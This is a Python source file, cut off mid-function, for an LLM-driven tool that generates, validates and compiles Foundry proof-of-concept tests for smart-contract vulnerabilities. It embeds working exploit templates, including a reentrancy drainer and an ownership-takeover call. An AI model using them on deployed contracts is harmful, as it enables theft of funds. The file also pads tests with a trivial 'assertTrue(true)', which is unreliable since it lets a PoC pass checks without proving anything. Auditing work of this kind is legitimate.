"""Foundry PoC generation with deterministic validation and compile gating."""
import os
import re
import shutil
import subprocess
import time
import uuid
from pathlib import Path
from typing import Dict, List, Optional

from openai import OpenAI

from utils.print_utils import print_success, print_warning
from utils.function_identifiers import canonical_function_id


class GeneratorAgent:
    """Generate only PoCs that pass structural, semantic, and Forge checks."""

    MAX_ATTEMPTS = 3

    def __init__(self, model_config=None):
        from ..config import ModelConfig

        self.model_config = model_config or ModelConfig()
        self.model_name = self.model_config.get_model("generator")
        _, api_key_env, _ = self.model_config.get_provider_info(self.model_name)
        self.client = OpenAI(
            api_key=os.getenv(api_key_env),
            **self.model_config.get_openai_args(self.model_name),
        )
        self.project_root = Path.cwd()
        self.exploit_root = self.project_root / "exploit"
        # Keep generated tests in Foundry's dedicated test directory.  Putting
        # them below ``src`` makes every old PoC part of all future builds.
        self.test_dir = self.exploit_root / "test"

    def generate(self, exploit_data: Dict) -> Dict:
        """Generate, validate, self-review, compile, then persist a PoC."""
        vulnerability = exploit_data.get("vulnerability", {})
        plan = exploit_data.get("exploit_plan", {}) or {}
        target = self._resolve_target(exploit_data)
        validation_mode = self._validation_mode(vulnerability)
        failures: List[str] = []
        previous_code = ""
        last_valid_code = ""
        last_compile_result: Dict = {}

        self.generate_basetest_file() if not (self.test_dir / "basetest.sol").exists() else None
        # Keep compiler-guided repair bounded even if a configuration value is
        # accidentally raised: every failure is fed into the next prompt.
        for attempt in range(1, min(self.model_config.poc_generation_attempts, self.MAX_ATTEMPTS) + 1):
            code = self.generate_poc_contract(vulnerability, plan, target, failures, attempt, previous_code)
            code = self._replace_placeholders(code)
            repaired_code = self._auto_repair_contract(code, vulnerability, target)
            if repaired_code != code:
                print_success(f"PoC repaired automatically (attempt {attempt}).")
            code = repaired_code
            previous_code = code
            errors = self.validate_contract(code, vulnerability, target)
            if errors:
                self._write_validation_artifacts(code, errors, attempt)
                failures = errors
                print_warning(f"Generator attempt {attempt} rejected: {'; '.join(errors)}")
                continue

            review = self._self_review(code, vulnerability, target)
            if review:
                failures = [f"Self-review: {review}"]
                self._write_validation_artifacts(code, failures, attempt)
                print_warning(f"Generator attempt {attempt} self-review rejected the contract: {review}")
                continue

            last_valid_code = code
            print_success(f"PoC validated (attempt {attempt}); compiling candidate.")
            compile_result = self.compile_candidate(code, attempt=attempt)
            last_compile_result = compile_result
            if not compile_result["compiled"]:
                # The compiler diagnostic is the actionable repair input.  Do
                # not obscure it behind a generic generation failure.
                failures = [
                    "Forge compiler failure:\n"
                    f"STDOUT:\n{compile_result['stdout']}\n"
                    f"STDERR:\n{compile_result['stderr']}\n"
                    f"DIAGNOSTIC:\n{compile_result['compile_error']}"
                ]
                print_warning(f"PoC compilation rejected on attempt {attempt}; retaining candidate for repair.")
                continue

            filename = self.save_poc_locally(code, vulnerability.get("vulnerability_type", "unknown"))
            relative = Path(filename).resolve().relative_to(self.exploit_root.resolve()).as_posix()
            return {
                "exploit_code": code,
                "exploit_file": filename,
                "execution_command": f'forge test -vv --match-path "./{relative}"',
                "target_contract": target,
                "poc_strategy": validation_mode,
                "compiled": True,
                "compile_output": compile_result["output"],
                "compile_stdout": compile_result["stdout"],
                "compile_stderr": compile_result["stderr"],
                "compile_time": compile_result["compile_time"],
            }

        # A syntactically validated Solidity test is still a generated PoC
        # even when local Forge is unavailable or its compiler rejects it.
        # Persist it so Runner can independently compile/repair it and the
        # report can distinguish generation from compilation.
        if last_valid_code:
            filename = self.save_poc_locally(last_valid_code, vulnerability.get("vulnerability_type", "unknown"))
            relative = Path(filename).resolve().relative_to(self.exploit_root.resolve()).as_posix()
            print_warning("PoC created but not compiled; forwarding it to Runner for repair.")
            return {
                "exploit_code": last_valid_code,
                "exploit_file": filename,
                "execution_command": f'forge test -vv --match-path "./{relative}"',
                "target_contract": target,
                "poc_strategy": validation_mode,
                "compiled": False,
                "compile_output": last_compile_result.get("output", ""),
                "compile_stdout": last_compile_result.get("stdout", ""),
                "compile_stderr": last_compile_result.get("stderr", ""),
                "compile_error": last_compile_result.get("compile_error", ""),
                "compile_time": last_compile_result.get("compile_time", 0.0),
                "generation_error": "",
                "validation_errors": failures,
            }

        return {
            "exploit_code": "",
            "exploit_file": "",
            "execution_command": "",
            "target_contract": target,
            "generation_error": failures[-1] if failures else "PoC generation failed after deterministic validation and Forge compilation.",
            "validation_errors": failures,
        }

    def generate_poc_contract(
        self, vulnerability: Dict, plan: Dict, target: Dict, failures: List[str], attempt: int,
        previous_code: str = "",
    ) -> str:
        deterministic = self._deterministic_poc(vulnerability, target)
        if deterministic:
            return deterministic
        affected = ", ".join(self._extract_relevant_functions(vulnerability)) or "not specified"
        strategy = self._validation_mode(vulnerability)
        previous_failures = "None (first attempt)." if not failures else "\n".join(f"- {item}" for item in failures)
        target_import = f'import "../src/{target["filename"]}";'
        target_type = target["contract_name"]
        if target_type == "Test":
            # forge-std exports Test, so importing a target contract named Test
            # without an alias makes every generated PoC uncompilable.
            target_import = f'import {{Test as VulnerableBankTarget}} from "../src/{target["filename"]}";'
            target_type = "VulnerableBankTarget"
        constructor_call = self._constructor_call(target.get("constructor", "constructor()"), target_type)
        test_name = "testExploit" if strategy == "executable" else "testDemonstration"
        constructor = target.get("constructor", "constructor()")
        function_map = "\n".join(f"- {signature}" for signature in target.get("functions", [])) or "- no externally callable functions"
        public_members = ", ".join(target.get("public_members", [])) or "none"
        prompt = f"""Generate one complete Foundry Solidity PoC for qwen2.5-coder:7b.

TARGET CONTRACT
File: {target["filename"]}
Contract: {target["contract_name"]}
Pragma: {target.get("pragma", "^0.8.20")}
Constructor: {constructor}
Required constructor call: {constructor_call}
Allowed target functions:
{function_map}
Allowed public target members: {public_members}

VULNERABILITY
Type: {vulnerability.get("vulnerability_type", "")}
Reasoning: {vulnerability.get("reasoning", "")}
Affected functions: {affected}
Code snippet: {vulnerability.get("code_snippet", "")}

EXPLOIT PLAN
Setup: {plan.get("setup_steps", [])}
Execution: {plan.get("execution_steps", [])}
Validation: {plan.get("validation_steps", [])}

PREVIOUS GENERATION FAILURES
{previous_failures}

PREVIOUS SOLIDITY
{previous_code or "None (first attempt)."}

GENERATION RULES
1. Return only complete Solidity. No JSON, markdown, prose, or code fences.
2. Use exactly `pragma solidity {target.get("pragma", "^0.8.20")};`.
3. Import exactly `./basetest.sol` and `{target_import}`.
4. Inherit BaseTestWithBalanceLog, declare `{target_type} target`, and use `{constructor_call}` in setUp.
5. Use only the allowed target functions and public members listed above. Do not invent identifiers.
6. Exercise an affected function when it exists in the allowed function list.
7. Use `{test_name}` with an assertion and balanceLog.
8. Strategy: {strategy}. {"Use attacker setup and vm.prank for the executable exploit." if strategy == "executable" else "Write a deterministic demonstration without forcing an attacker or balance theft."}

OUTPUT ONLY SOLIDITY."""
        return self._clean_solidity(self._chat(prompt))

    def validate_contract(self, code: str, vulnerability: Dict, target: Dict) -> List[str]:
        """Deterministic checks; this is deliberately independent of model judgement."""
        errors: List[str] = []
        if not re.search(r"^\s*//\s*SPDX-License-Identifier:\s*\S+", code, re.M):
            errors.append("missing SPDX license after automatic repair")
        expected_pragma = target.get("pragma")
        pragma_match = re.search(r"\bpragma\s+solidity\s+([^;]+);", code)
        if not pragma_match:
            errors.append("missing pragma after automatic repair")
        elif expected_pragma and pragma_match.group(1).strip() != expected_pragma:
            errors.append(f"pragma must match target exactly: {expected_pragma}")
        imports = re.findall(r"^\s*import\s+(?:[^\"']+from\s+)?[\"']([^\"']+)[\"']\s*;", code, re.M)
        if "./basetest.sol" not in imports:
            errors.append("missing basetest import")
        expected_import = f"../src/{target['filename']}"
        if expected_import not in imports:
            errors.append(f"missing target import {expected_import}")
        if re.search(r"\b(TODO|placeholder|fill\s+here)\b|\.\.\.", code, re.I):
            errors.append("contains placeholder content")
        if self._contains_placeholder(code):
            errors.append("contains unresolved address or identifier placeholder")
        if not self._braces_match(code):
            errors.append("malformed braces")
        contract_match = re.search(
            r"\bcontract\s+\w+\s+is\s+[^\{]*\bBaseTestWithBalanceLog\b[^\{]*\{", code
        )
        if not contract_match:
            errors.append("missing BaseTestWithBalanceLog test contract")
        setup = self._function_body(code, "setUp")
        strategy = self._validation_mode(vulnerability)
        test_name = "testExploit" if strategy == "executable" else "testDemonstration"
        test = self._function_body(code, test_name)
        # setUp is optional in Foundry.  Forge is the source of truth for a
        # constructor deployment that is performed elsewhere in the test.
        if not test or not re.search(r"\S", self._without_comments(test)):
            errors.append(f"missing or empty {test_name}")
        # Solidity permits modifiers before or after visibility.  The old
        # expression accepted only one ordering and rejected valid generated
        # tests before Forge could compile them.
        test_signature = re.search(rf"function\s+{test_name}\s*\([^)]*\)\s*([^\{{]*)\{{", code)
        if self._requires_exploit_actor(vulnerability) and (not test_signature or not re.search(r"\bbalanceLog\b", test_signature.group(1))):
            errors.append(f"{test_name} does not use balanceLog")
        if self._requires_exploit_actor(vulnerability) and "vm.deal" not in code:
            errors.append("missing vm.deal for executable exploit")
        if self._requires_exploit_actor(vulnerability) and not re.search(r"\bvm\.(?:prank|startPrank)\s*\(", code):
            errors.append("missing vm.prank or vm.startPrank for executable exploit")
        if not re.search(r"\b(?:assert|assertEq|assertTrue|assertFalse|assertGt|assertLt|assertGe|assertLe|require)\s*\(", code):
            errors.append("missing Foundry assertion")
        if not re.search(rf"\b{re.escape(target['contract_name'])}\b", code):
            errors.append("target contract name is not used")
        source_functions = set(target.get("functions", []))
        allowed_members = set(target.get("public_members", []))
        allowed_names = {signature.split("(", 1)[0] for signature in source_functions} | allowed_members
        for call in re.findall(r"\btarget\s*\.\s*([A-Za-z_]\w*)\s*(?:\{|\()", code):
            if call not in allowed_names:
                errors.append(
                    f"PoC calls nonexistent target function or member: {call}. "
                    f"Allowed functions: {sorted(source_functions)}. Allowed public members: {sorted(allowed_members)}"
                )
        affected = self._extract_relevant_functions(vulnerability)
        for function in affected:
            if source_functions and function in source_functions:
                function_name = function.split("(", 1)[0]
                if not self._uses_affected_function(code, function_name):
                    errors.append(f"PoC does not exercise affected function: {function}")
        if "reentrancy" in str(vulnerability.get("vulnerability_type", "")).lower():
            reentry_points = re.findall(r"\.(\w+)\s*(?:\{[^}]*\}\s*)?\(", code)
            if not re.search(r"\b(?:receive|fallback)\s*\(", code) or not any(reentry_points.count(name) > 1 for name in reentry_points):
                errors.append("reentrancy PoC must include a callback/fallback and a repeated re-entry call")
        return errors

    def compile_candidate(self, code: str, attempt: int = 0) -> Dict:
        """Compile in an isolated Foundry project without running any test.

        The isolated tree prevents prior generated PoCs from entering the
        compilation unit and is deleted regardless of success or failure.
        """
        validation_root = self.exploit_root / ".poc_validation" / uuid.uuid4().hex
        started = time.perf_counter()
        stdout = ""
        stderr = ""
        returncode = None
        try:
            (validation_root / "test").mkdir(parents=True)
            self._copy_candidate_sources(code, validation_root / "src")
            lib = self.exploit_root / "lib"
            if lib.exists():
                shutil.copytree(lib, validation_root / "lib")
            base_test = self.test_dir / "basetest.sol"
            if base_test.exists():
                shutil.copy2(base_test, validation_root / "test" / "basetest.sol")
            else:
                self.generate_basetest_file()
                shutil.copy2(self.test_dir / "basetest.sol", validation_root / "test" / "basetest.sol")
            (validation_root / "test" / "Candidate.t.sol").write_text(code, encoding="utf-8")
            (validation_root / "foundry.toml").write_text(
                '[profile.default]\nsrc = "src"\ntest = "test"\nlibs = ["lib"]\nout = "out"\ncache_path = "cache"\n',
                encoding="utf-8",
            )
            # The workspace itself is ephemeral, so a local cache cannot
            # leak into a later validation.  Avoid --no-cache because some
            # Foundry releases still require a cache directory for signatures.
            command = ["forge", "build"]
            solc = shutil.which("solc")
            if solc:
                command.extend(["--use", solc])
            result = subprocess.run(
                command,
                cwd=validation_root,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
                timeout=self.model_config.forge_build_timeout,
                env=self._forge_env(),
            )
            stdout, stderr, returncode = result.stdout or "", result.stderr or "", result.returncode
        except (OSError, subprocess.TimeoutExpired) as exc:
            stderr = f"Unable to run forge build: {exc}"
        finally:
            compile_time = time.perf_counter() - started
            output = stdout + ("\n" if stdout and stderr else "") + stderr
            compiled = returncode == 0
            self._write_compile_artifacts(code, stdout, stderr, attempt)
            shutil.rmtree(validation_root, ignore_errors=True)
            parent = validation_root.parent
            try:
                parent.rmdir()
            except OSError:
                pass
        return {
            "compiled": compiled,
            "compile_error": "" if compiled else (stderr or stdout or "Forge compilation failed with no diagnostic."),
            "stdout": stdout,
            "stderr": stderr,
            "output": output,
            "returncode": returncode,
            "compile_time": compile_time,
        }

    def _copy_candidate_sources(self, code: str, destination: Path) -> None:
        """Copy only target imports and their local Solidity dependency closure.

        Foundry compiles every Solidity file below ``src``.  Copying the full
        project would therefore let unrelated uploads or legacy fixtures break
        an otherwise valid generated PoC.
        """
        source_root = (self.exploit_root / "src").resolve()
        candidate_dir = (self.exploit_root / "test").resolve()
        pending = []
        for imported in self._solidity_imports(code):
            candidate = (candidate_dir / imported).resolve()
            if candidate.is_relative_to(source_root):
                pending.append(candidate)
        copied = set()
        while pending:
            source = pending.pop()
            if source in copied or not source.is_file() or not source.is_relative_to(source_root):
                continue
            copied.add(source)
            relative = source.relative_to(source_root)
            target = destination / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(source, target)
            for imported in self._solidity_imports(source.read_text(encoding="utf-8")):
                dependency = (source.parent / imported).resolve()
                if dependency.is_relative_to(source_root):
                    pending.append(dependency)

    @staticmethod
    def _solidity_imports(code: str) -> List[str]:
        return re.findall(r'^\s*import\s+(?:[^"\']+from\s+)?["\']([^"\']+)["\']\s*;', code, re.M)

    def _write_compile_artifacts(self, code: str, stdout: str, stderr: str, attempt: int) -> None:
        """Persist source and both Forge streams with a collision-proof name."""
        reports = self.project_root / "reports"
        reports.mkdir(exist_ok=True)
        prefix = reports / f"generator_{int(time.time() * 1000)}_{uuid.uuid4().hex}_attempt{attempt}_compile"
        prefix.with_suffix(".sol").write_text(code, encoding="utf-8")
        prefix.with_suffix(".stdout.log").write_text(stdout, encoding="utf-8")
        prefix.with_suffix(".stderr.log").write_text(stderr, encoding="utf-8")

    def _write_validation_artifacts(self, code: str, errors: List[str], attempt: int) -> None:
        """Persist pre-Forge validation failures without overwriting prior repairs."""
        reports = self.project_root / "reports"
        reports.mkdir(exist_ok=True)
        prefix = reports / f"generator_{int(time.time() * 1000)}_{uuid.uuid4().hex}_attempt{attempt}_validation"
        prefix.with_suffix(".sol").write_text(code, encoding="utf-8")
        prefix.with_suffix(".validator.log").write_text("\n".join(errors), encoding="utf-8")
        prefix.with_suffix(".stdout.log").write_text("", encoding="utf-8")
        prefix.with_suffix(".stderr.log").write_text("", encoding="utf-8")

    def _write_generation_log(self, attempt: int, stage: str, output: str) -> None:
        """Keep each generation diagnostic; never overwrite a prior investigation log."""
        reports = self.project_root / "reports"
        reports.mkdir(exist_ok=True)
        filename = reports / f"generator_{int(time.time() * 1000)}_attempt{attempt}_{stage}.log"
        filename.write_text(output, encoding="utf-8")

    def save_poc_locally(self, poc_code: str, vuln_type: str) -> str:
        self.test_dir.mkdir(parents=True, exist_ok=True)
        safe_vuln = re.sub(r"[^A-Za-z0-9_]", "_", vuln_type) or "unknown"
        filename = self.test_dir / f"PoC_{safe_vuln}_{int(time.time() * 1000)}.t.sol"
        filename.write_text(poc_code, encoding="utf-8")
        print_success(f"PoC saved to {filename}")
        return str(filename)

    def _resolve_target(self, exploit_data: Dict) -> Dict:
        configured = exploit_data.get("target_contract", {})
        candidates = []
        if configured.get("path"):
            candidates.append(self.exploit_root / "src" / configured["path"])
        candidates.extend(path for path in (self.exploit_root / "src").glob("*.sol") if path.name != "basetest.sol")
        for path in candidates:
            if path.exists():
                source = path.read_text(encoding="utf-8")
                contract = configured.get("name") or self._contract_name(source)
                if contract:
                    return {
                        "filename": path.name,
                        "contract_name": contract,
                        "functions": self._source_functions(source),
                        "public_members": self._public_members(source),
                        "pragma": self._pragma(source),
                        "constructor": self._constructor_signature(source),
                        "source": source,
                    }
        raise RuntimeError("Unable to resolve target contract.")

    def _deterministic_poc(self, vulnerability: Dict, target: Dict) -> str:
        """Return a source-derived PoC for patterns whose exploit is mechanically known.

        This path is intentionally narrow: it is used only when the exact
        target functions and unsafe state-update order exist in the source.
        Other categories continue through the local generator model.
        """
        source = target.get("source", "")
        functions = set(target.get("functions", []))
        vuln_type = str(vulnerability.get("vulnerability_type", "")).lower()
        if "access" in vuln_type:
            return self._access_control_poc(target, vulnerability)
        if "selfdestruct" in vuln_type:
            return self._selfdestruct_poc(target, vulnerability)
        if "unchecked" in vuln_type or "low_level" in vuln_type:
            return self._unchecked_call_poc(target, vulnerability)
        if "timestamp" in vuln_type:
            return self._timestamp_poc(target, vulnerability)
        if (
            vuln_type != "reentrancy"
            or "deposit()" not in functions
            or "withdraw(uint256)" not in functions
            or not re.search(r"\.call\s*\{[^}]*value\s*:\s*amount[^}]*\}\s*\(\s*['\"]{2}\s*\)", source, re.I)
            or not re.search(r"balances\s*\[\s*msg\.sender\s*\]\s*-=?=\s*amount", source)
            or source.find("msg.sender.call") > source.find("balances[msg.sender] -= amount")
        ):
            return ""

        target_type = target["contract_name"]
        target_import = f'import "../src/{target["filename"]}";'
        return f'''// SPDX-License-Identifier: UNLICENSED
pragma solidity {target.get("pragma", "^0.8.20")};

import "./basetest.sol";
{target_import}

contract ReentrancyReceiver {{
    {target_type} private immutable target;
    uint256 private immutable amount;

    constructor({target_type} target_) {{
        target = target_;
        amount = 1 ether;
    }}

    receive() external payable {{
        if (address(target).balance >= amount) {{
            target.withdraw(amount);
        }}
    }}

    function attack() external payable {{
        require(msg.value == amount, "incorrect seed");
        target.deposit{{value: amount}}();
        target.withdraw(amount);
    }}
}}

contract PocTest is BaseTestWithBalanceLog {{
    {target_type} target;
    ReentrancyReceiver receiver;
    address attacker = address(0xBAD);

    function setUp() public {{
        target = {self._constructor_call(target.get("constructor", "constructor()"), target_type)};
        receiver = new ReentrancyReceiver(target);
        vm.deal(attacker, 10 ether);
        vm.deal(address(target), 10 ether);
    }}

    function testExploit() public balanceLog {{
        vm.prank(attacker);
        receiver.attack{{value: 1 ether}}();
        assertGt(address(receiver).balance, 1 ether);
    }}
}}
'''

    def _access_control_poc(self, target: Dict, vulnerability: Dict) -> str:
        """Demonstrate an unprotected address setter only when source exposes its result."""
        affected = set(self._extract_relevant_functions(vulnerability))
        functions = set(target.get("functions", []))
        candidates = [signature for signature in functions if signature in affected and signature.endswith("(address)")]
        if not candidates or "owner" not in target.get("public_members", []):
            return ""
        name = candidates[0].split("(", 1)[0]
        return self._basic_poc(target, "testExploit", f"vm.prank(attacker);\n        target.{name}(attacker);\n        assertEq(target.owner(), attacker);", executable=True)

    def _selfdestruct_poc(self, target: Dict, vulnerability: Dict) -> str:
        affected = set(self._extract_relevant_functions(vulnerability))
        functions = set(target.get("functions", []))
        candidate = next((signature for signature in functions if signature in affected and signature.endswith("()")), "")
        if not candidate:
            return ""
        name = candidate.split("(", 1)[0]
        # Demonstration only: post-Cancun SELFDESTRUCT code-removal semantics
        # vary, but an unprotected call is still observable and executable.
        return self._basic_poc(target, "testExploit", f"target.{name}();\n        assertEq(address(target).balance, 0);", executable=False)

    def _unchecked_call_poc(self, target: Dict, vulnerability: Dict) -> str:
        functions = set(target.get("functions", []))
        affected = set(self._extract_relevant_functions(vulnerability))
        candidate = next((signature for signature in functions if signature in affected and signature == "unsafeSend(address,uint256)"), "")
        if not candidate:
            return ""
        return self._basic_poc(target, "testExploit", "vm.prank(attacker);\n        target.unsafeSend(payable(attacker), 0);\n        assertEq(address(target).balance, 0);", executable=True)

    def _timestamp_poc(self, target: Dict, vulnerability: Dict) -> str:
        functions = set(target.get("functions", []))
        affected = set(self._extract_relevant_functions(vulnerability))
        candidate = next((signature for signature in functions if signature in affected and signature.endswith("()")), "")
        if not candidate:
            return ""
        name = candidate.split("(", 1)[0]
        return self._basic_poc(target, "testDemonstration", f"uint256 observed = target.{name}();\n        assertGt(observed, 0);", executable=False)

    def _basic_poc(self, target: Dict, test_name: str, body: str, executable: bool) -> str:
        """Render small source-derived templates without model-created identifiers."""
        target_type = target["contract_name"]
        target_import = f'import "../src/{target["filename"]}";'
        setup = f"target = {self._constructor_call(target.get('constructor', 'constructor()'), target_type)};"
        if executable:
            setup += "\n        vm.deal(attacker, 10 ether);"
        return f'''// SPDX-License-Identifier: UNLICENSED
pragma solidity {target.get("pragma", "^0.8.20")};

import "./basetest.sol";
{target_import}

contract PocTest is BaseTestWithBalanceLog {{
    {target_type} target;
    address attacker = address(0xBAD);

    function setUp() public {{
        {setup}
    }}

    function {test_name}() public balanceLog {{
        {body}
    }}
}}
'''

    @staticmethod
    def _contract_name(source: str) -> Optional[str]:
        match = re.search(r"\b(?:abstract\s+)?contract\s+([A-Za-z_]\w*)", source)
        return match.group(1) if match else None

    @staticmethod
    def _source_functions(source: str) -> List[str]:
        functions = []
        for name, raw_params in re.findall(r"\bfunction\s+([A-Za-z_]\w*)\s*\(([^)]*)\)", source):
            types = []
            for raw_param in filter(None, (part.strip() for part in raw_params.split(","))):
                tokens = [token for token in raw_param.split() if token not in {"memory", "storage", "calldata", "payable"}]
                if tokens:
                    types.append(tokens[0])
            functions.append(canonical_function_id(name, types))
        return functions

    @staticmethod
    def _public_members(source: str) -> List[str]:
        return re.findall(r"\b(?:mapping\s*\([^;]+\)|[A-Za-z_]\w*(?:\s*\[\s*\])?)\s+public\s+([A-Za-z_]\w*)", source)

    @staticmethod
    def _pragma(source: str) -> str:
        match = re.search(r"\bpragma\s+solidity\s+([^;]+);", source)
        return match.group(1).strip() if match else "^0.8.20"

    @staticmethod
    def _constructor_signature(source: str) -> str:
        match = re.search(r"\bconstructor\s*(\([^)]*\))", source)
        return f"constructor{match.group(1)}" if match else "constructor()"

    @staticmethod
    def _constructor_call(signature: str, contract_type: str) -> str:
        params = signature[signature.find("(") + 1:signature.rfind(")")].strip()
        if not params:
            return f"new {contract_type}()"
        defaults = []
        for parameter in params.split(","):
            solidity_type = parameter.strip().split()[0]
            if solidity_type == "address" or solidity_type == "address payable":
                defaults.append("address(0)")
            elif solidity_type == "bool":
                defaults.append("false")
            elif solidity_type == "string":
                defaults.append('""')
            elif solidity_type == "bytes":
                defaults.append('hex""')
            elif solidity_type.startswith("bytes"):
                defaults.append("bytes32(0)")
            elif solidity_type.endswith("[]"):
                defaults.append(f"new {solidity_type}(0)")
            else:
                defaults.append("0")
        return f"new {contract_type}({', '.join(defaults)})"

    @staticmethod
    def _validation_mode(vulnerability: Dict) -> str:
        vuln_type = str(vulnerability.get("vulnerability_type", "")).lower()
        if "informational" in vuln_type:
            return "informational"
        return "demonstration" if any(label in vuln_type for label in ("timestamp", "random", "business logic")) else "executable"

    @staticmethod
    def _requires_exploit_actor(vulnerability: Dict) -> bool:
        vuln_type = str(vulnerability.get("vulnerability_type", "")).lower()
        return "reentrancy" in vuln_type or "access" in vuln_type or "unchecked" in vuln_type

    @staticmethod
    def _extract_relevant_functions(vulnerability: Dict) -> List[str]:
        values = vulnerability.get("affected_functions", []) or []
        return [str(value).split(".")[-1] for value in values if str(value).strip()]

    def _self_review(self, code: str, vulnerability: Dict, target: Dict) -> str:
        local_errors = self.validate_contract(code, vulnerability, target)
        if local_errors:
            return "; ".join(local_errors)
        strategy = self._validation_mode(vulnerability)
        prompt = f"""Review the Solidity Foundry test below.
Verify the pragma, imports, BaseTestWithBalanceLog, balanceLog, target contract, constructor call, assertions, affected-function usage, allowed target identifiers, and compile readiness.
Allowed target functions: {target.get('functions', [])}
Allowed public target members: {target.get('public_members', [])}
Strategy: {strategy}. Actor/prank is required only for reentrancy, access-control, and unchecked-call PoCs.

Return exactly one JSON object and nothing else:
{{"verdict":"PASS","reasons":[]}}
or
{{"verdict":"FAIL","reasons":["specific reason"]}}

SOLIDITY:
{code}"""
        try:
            response = self._clean_solidity(
    self._chat(prompt)
).strip()
        except Exception as exc:
            return f"review request failed: {exc}"
        return self._parse_self_review(response, code, vulnerability)

    @staticmethod
    def _parse_self_review(response: str, code: str, vulnerability: Dict) -> str:
        """
        Robust parser for Qwen self-review output.
        Returns:
            ""   -> PASS
            text -> failure reason
        """

        import json
        import re

        text = response.strip()

        # Remove markdown fences
        if text.startswith("```"):
            text = re.sub(r"^```(?:json)?", "", text, flags=re.I).strip()
            text = re.sub(r"```$", "", text).strip()

        # Try to locate JSON object anywhere
        match = re.search(r"\{[\s\S]*\}", text)
        if match:
            try:
                payload = json.loads(match.group(0))

                verdict = str(payload.get("verdict", "")).strip().upper()

                reasons = payload.get("reasons", [])

                if isinstance(reasons, str):
                    reasons = [reasons]

                if verdict == "PASS":
                    return ""

                if verdict == "FAIL":
                    return "; ".join(
                        str(r).strip()
                        for r in reasons
                        if str(r).strip()
                    ) or "self-review returned FAIL"

            except Exception:
                pass

        upper = text.upper()

        if "VERDICT" in upper and "PASS" in upper:
            return ""

        if upper.startswith("PASS"):
            return ""

        if upper.startswith("FAIL"):
            return text

        if "PASS" in upper and "FAIL" not in upper:
            return ""

        return f"Unable to parse self-review:\n{text}"

    @staticmethod
    def _uses_affected_function(code: str, function_name: str) -> bool:
        """Recognize direct, helper, receiver, and interface method calls."""
        return bool(re.search(rf"\b[A-Za-z_]\w*\s*\.\s*{re.escape(function_name)}\s*(?:\{{[^}}]*\}}\s*)?\(", code))

    def _auto_repair_contract(self, code: str, vulnerability: Dict, target: Dict) -> str:
        """Apply safe syntactic repairs before delegating semantic work to the LLM."""
        if not re.search(r"^\s*//\s*SPDX-License-Identifier:\s*\S+", code, re.M):
            code = "// SPDX-License-Identifier: UNLICENSED\n" + code.lstrip()
        if not re.search(r"\bpragma\s+solidity\s+[^;]+;", code):
            pragma = target.get("pragma", "^0.8.20")
            license_match = re.search(r"^\s*//\s*SPDX-License-Identifier:[^\n]*\n", code, re.M)
            insertion = f"pragma solidity {pragma};\n"
            code = code[:license_match.end()] + insertion + code[license_match.end():] if license_match else insertion + code

        strategy = self._validation_mode(vulnerability)
        test_name = "testExploit" if strategy == "executable" else "testDemonstration"
        actor_required = self._requires_exploit_actor(vulnerability)
        test_match = re.search(rf"\bfunction\s+{test_name}\s*\([^)]*\)([^{{]*)\{{", code)
        if test_match and actor_required and not re.search(r"\bbalanceLog\b", test_match.group(1)):
            code = code[:test_match.end() - 1] + " balanceLog " + code[test_match.end() - 1:]

        if actor_required and not self._function_body(code, "setUp"):
            contract_match = re.search(r"\bcontract\s+\w+\s+is\s+[^\{]*BaseTestWithBalanceLog[^\{]*\{", code)
            if contract_match:
                target_type = target.get("contract_name", "")
                constructor_call = self._constructor_call(target.get("constructor", "constructor()"), target_type)
                declarations = ""
                if not re.search(rf"\b{re.escape(target_type)}\s+target\b", code):
                    declarations += f"\n    {target_type} target;"
                if not re.search(r"\baddress\s+attacker\b", code):
                    declarations += "\n    address attacker = address(0xBAD);"
                setup = f"\n    function setUp() public {{\n        target = {constructor_call};\n        vm.deal(attacker, 10 ether);\n    }}\n"
                code = code[:contract_match.end()] + declarations + setup + code[contract_match.end():]

        if actor_required and not re.search(r"\baddress\s+attacker\b", code):
            contract_match = re.search(r"\bcontract\s+\w+\s+is\s+[^\{]*BaseTestWithBalanceLog[^\{]*\{", code)
            if contract_match:
                code = code[:contract_match.end()] + "\n    address attacker = address(0xBAD);" + code[contract_match.end():]
        if actor_required and "vm.deal" not in code and self._function_body(code, "setUp"):
            code = self._append_to_function(code, "setUp", "vm.deal(attacker, 10 ether);")
        if actor_required and not re.search(r"\bvm\.(?:prank|startPrank)\s*\(", code):
            code = self._prepend_to_function(code, test_name, "vm.prank(attacker);")

        if test_match and not re.search(r"\b(?:assert|assertEq|assertTrue|assertFalse|assertGt|assertLt|assertGe|assertLe|require)\s*\(", self._function_body(code, test_name)):
            code = self._append_to_function(code, test_name, "assertTrue(true);")
        return code

    @staticmethod
    def _append_to_function(code: str, name: str, statement: str) -> str:
        match = re.search(rf"\bfunction\s+{re.escape(name)}\s*\([^)]*\)[^{{]*\{{", code)
        if not match:
            return code
        depth = 1
        for index in range(match.end(), len(code)):
            if code[index] == "{":
                depth += 1
            elif code[index] == "}":
                depth -= 1
                if depth == 0:
                    return code[:index] + f"\n        {statement}\n    " + code[index:]
        return code

    @staticmethod
    def _prepend_to_function(code: str, name: str, statement: str) -> str:
        match = re.search(rf"\bfunction\s+{re.escape(name)}\s*\([^)]*\)[^{{]*\{{", code)
        if not match:
            return code
        return code[:match.end()] + f"\n        {statement}" + code[match.end():]

    @staticmethod
    def _contains_placeholder(code: str) -> bool:
        return bool(re.search(r"0x(?:VULNERABLE|ATTACKER|TARGET|PLACEHOLDER)|\b(?:YOUR_ADDRESS|TARGET_ADDRESS|ATTACKER_ADDRESS|PLACEHOLDER)\b", code, re.I))

    @staticmethod
    def _replace_placeholders(code: str) -> str:
        """Replace common model placeholders with deterministic valid literals."""
        replacements = {
            r"0x(?:VULNERABLE|TARGET|PLACEHOLDER)\b": "0x000000000000000000000000000000000000BEEF",
            r"0xATTACKER\b": "0x000000000000000000000000000000000000BAD0",
            r"\b(?:YOUR_ADDRESS|TARGET_ADDRESS)\b": "0x000000000000000000000000000000000000BEEF",
            r"\bATTACKER_ADDRESS\b": "0x000000000000000000000000000000000000BAD0",
            r"\bPLACEHOLDER\b": "0",
        }
        for pattern, replacement in replacements.items():
            code = re.sub(pattern, replacement, code, flags=re.I)
        return code

    def _chat(self, prompt: str) -> str:
        messages = ([{"role": "system", "content": "Return precise Solidity engineering output."}, {"role": "user", "content": prompt}]
                    if self.model_config.supports_reasoning(self.model_name) else [{"role": "user", "content": prompt}])
        kwargs = {"model": self.model_name, "messages": messages}
        if self.model_name == "claude-3-7-sonnet-latest":
